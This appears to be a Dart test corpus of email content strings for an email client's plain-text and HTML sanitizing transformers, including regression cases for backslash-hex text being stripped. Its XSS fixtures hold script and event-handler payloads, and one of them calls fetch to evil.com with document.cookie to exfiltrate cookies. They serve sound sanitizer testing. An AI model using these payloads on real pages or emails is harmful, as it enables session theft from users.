/// Canonical test corpus for email content transformer unit tests in core/.
///
/// Each constant is a real-world class of email content that exercises a
/// distinct transformer behaviour or known regression. Organizing data here
/// removes duplication across test files and makes the regression catalogue
/// visible in one place.
///
/// Categories
/// ──────────
/// • Plain-text variants — used by textPlain pipeline tests.
/// • HTML variants       — used by StandardizeHtmlSanitizingTransformers tests.
/// • TF-4524 regression  — backslash-hex patterns that previously triggered
///   a false-positive in dart-neats' unicodeEscapeReg, stripping text nodes.
abstract final class EmailContentCorpus {
  // ─── Plain text: simple ────────────────────────────────────────────────────
  static const String plainSimple = 'Hello Alice, how are you today?';
  static const String plainMultiLine =
      'Dear Alice,\n\nThank you for the update.\n\nBest regards,\nBob';
  static const String plainUnicode = 'مرحبا 🎉 résumé 日本語 한국어 Üniversität';
  static const String plainLtGtAmpersand = 'if (a < b && b > 0) return a & b;';
  static const String plainAmpersand = 'Tom & Jerry: The Movie';

  // ─── Plain text: URLs and email addresses ─────────────────────────────────
  static const String plainWithHttpsUrl = 'See https://example.com for details';
  static const String plainWithHttpUrl = 'Visit http://example.com today';
  static const String plainWithEmailAddress = 'Contact support@example.com for help';
  static const String plainWithUrlQuery =
      'Search at https://example.com/q?term=hello+world&lang=en';
  static const String plainWithMultipleUrls =
      'Docs: https://docs.example.com\nAPI: https://api.example.com/v1';

  // ─── Plain text: XSS attempts ──────────────────────────────────────────────
  static const String xssScriptInPlain = 'Hello <script>alert("xss")</script> world';
  static const String xssImgOnerrorInPlain = 'Click <img src=x onerror="alert(1)"> here';
  static const String xssOnclickInPlain = '<div onclick="steal()">Click me</div>';
  static const String xssSvgInPlain = '<svg onload="alert(1)"><rect/></svg>';

  // ─── TF-4524 regression: backslash-hex in raw plain text ──────────────────
  // Root cause: StandardizeHtmlSanitizingTransformers was mistakenly applied to
  // raw plain text (not HTML). The unicodeEscapeReg in dart-neats matched
  // \XX (backslash + two hex digits, e.g. \AB in "\App\DB") and stripped entire
  // text nodes → blank email body. Fix: stop running dart-neats on plain text.
  static const String phpNamespaceOneLine =
      r'throw new \App\DB\Exception\AuthFailed("access denied");';
  static const String phpNamespaceMultiLine =
      r'Fatal error: Uncaught \App\Http\Exception\NotFound' '\n'
      r'Stack trace: #0 \App\Router\Dispatcher::dispatch()' '\n'
      'In file: /var/www/html/public/index.php on line 42';
  static const String goPackagePath =
      r'FAILED: \github.com\org\repo\pkg\handler\main.go';
  static const String windowsFilePath =
      r'C:\Users\Admin\AppData\Local\Temp\error.log';
  static const String allHexBackslashLines =
      r'\AB\CD path one' '\n' r'\EF\01 path two';

  // ─── TF-4524 regression: backslash-hex inside HTML text nodes ─────────────
  // The dart-neats fix (branch fix/tighten-unicode-escape-regex) tightens the
  // regex so \XX inside HTML text nodes of a legitimate HTML email are no longer
  // stripped. These constants verify the fix for the textHtml pipeline.
  static const String htmlWithBackslashInCode =
      r'<p>Error: <code>\App\DB\Exception\AuthFailed</code> — access denied.</p>'
      '<p>Please check the docs for details.</p>';
  static const String htmlWithBackslashMultipleNodes =
      r'<h2>Error Report</h2>'
      r'<p>Exception: <code>\App\DB\Exception\NotFound</code></p>'
      r'<p>Stack: <code>\App\Router\Dispatcher::dispatch()</code></p>';
  static const String htmlWithBackslashAndLink =
      r'<p>Exception: <code>\App\DB\Exception\AuthFailed</code>.</p>'
      '<p>See <a href="https://docs.example.com/errors">docs</a> for the fix.</p>';
  static const String htmlWithWindowsPath =
      r'<p>File: <code>C:\Users\Admin\AppData\Local\Temp\error.log</code></p>';
  static const String htmlWithGoPath =
      r'<p>FAILED: <code>\github.com\org\repo\pkg\handler\main.go</code></p>';
  static const String htmlAllHexBackslashParagraphs =
      r'<p>Path: \AB\CD\EF</p>'
      r'<p>Config: \01\23\45</p>';

  // ─── Preformatted / table detection ───────────────────────────────────────
  static const String markdownTable =
      '| Name  | Score |\n'
      '|-------|-------|\n'
      '| Alice | 100   |\n'
      '| Bob   | 90    |';
  static const String markdownTableWithUrl =
      '| Name  | Link                   |\n'
      '|-------|------------------------|\n'
      '| Alice | https://alice.com/page |';
  static const String asciiArtBox =
      '+--------+-------+\n'
      '| Alice  | 100   |\n'
      '+--------+-------+\n'
      '| Bob    | 90    |\n'
      '+--------+-------+';

  // ─── Line endings ──────────────────────────────────────────────────────────
  static const String windowsCrlfContent = 'Line one\r\nLine two\r\nLine three';
  static const String mixedLineEndings = 'First\r\nSecond\nThird\r\nFourth';

  // ─── Quoted reply thread ───────────────────────────────────────────────────
  static const String quotedReplyWithUrl =
      'Hi Alice,\n'
      '\n'
      '> On Monday you wrote:\n'
      '> Please review https://example.com/pr/42\n'
      '\n'
      'Done, looks good!';
  static const String deeplyQuotedThread =
      'Hi Bob,\n'
      '\n'
      '> On Monday, Alice wrote:\n'
      '>> On Friday, Charlie wrote:\n'
      '>> The issue is at https://bugs.example.com/42\n'
      '> Alice: confirmed, reproducing locally.\n'
      '\n'
      'Bob: I have a fix, see https://github.com/example/repo/pr/99';

  // ─── Complex plain text ────────────────────────────────────────────────────
  static const String codeWithBrackets =
      'if (x > 0 && y < 100) {\n  return "valid";\n}';
  static const String pythonCode =
      'def greet(name: str) -> str:\n'
      '    return f"Hello, {name}!"\n'
      '\n'
      'print(greet("World"))';
  static const String javaCode =
      'public class Example {\n'
      '    public static void main(String[] args) {\n'
      '        System.out.println("Hello " + args[0]);\n'
      '    }\n'
      '}';

  // ─── Markdown-like plain text ──────────────────────────────────────────────
  static const String markdownBodyPlain =
      '# Monthly Report\n'
      '\n'
      '## Summary\n'
      '- Revenue: \$1.2M (+12%)\n'
      '- Active users: 45,000\n'
      '\n'
      '**Action:** Review the full dashboard at https://analytics.example.com\n'
      '\n'
      '```python\n'
      'def calc(x): return x * 1.12\n'
      '```';

  // ─── XML-like content in plain text ───────────────────────────────────────
  static const String xmlBodyPlain =
      'API response:\n'
      '<?xml version="1.0"?>\n'
      '<response><status>200</status><message>OK</message></response>';

  // ─── Simple HTML ───────────────────────────────────────────────────────────
  static const String htmlSimpleParagraph = '<p>Hello World</p>';
  static const String htmlWithBold = '<p>Hello <strong>World</strong>!</p>';
  static const String htmlWithSafeLink =
      '<p>Visit <a href="https://example.com">our site</a> today.</p>';
  static const String htmlWithUnicode = '<p>مرحبا 🎉 résumé 日本語 한국어</p>';

  // ─── HTML: XSS-rich ────────────────────────────────────────────────────────
  static const String htmlXssRich =
      '<div>'
      '<script>document.cookie="stolen";</script>'
      '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">'
      '<svg><script>alert(\'svg\')</script></svg>'
      '<a href="javascript:void(0)" onclick="alert(1)">Click</a>'
      '<p style="background: url(\'javascript:alert(1)\')">Styled</p>'
      '<p onmouseover="alert(1)">Hover me</p>'
      '<p>Valid content.</p>'
      '</div>';

  // ─── HTML: deeply nested tags ──────────────────────────────────────────────
  static const String htmlDeeplyNested =
      '<div><section><article><aside>'
      '<p><strong><em><span style="color:red">deeply nested</span></em></strong></p>'
      '</aside></article></section></div>';

  // ─── HTML: multi-language ──────────────────────────────────────────────────
  static const String htmlRtlArabic =
      '<div dir="rtl"><p>مرحبا بالعالم</p><p>البريد الإلكتروني</p></div>';
  static const String htmlCjk =
      '<div><p>日本語: メールクライアント</p><p>中文: 电子邮件客户端</p></div>';
}
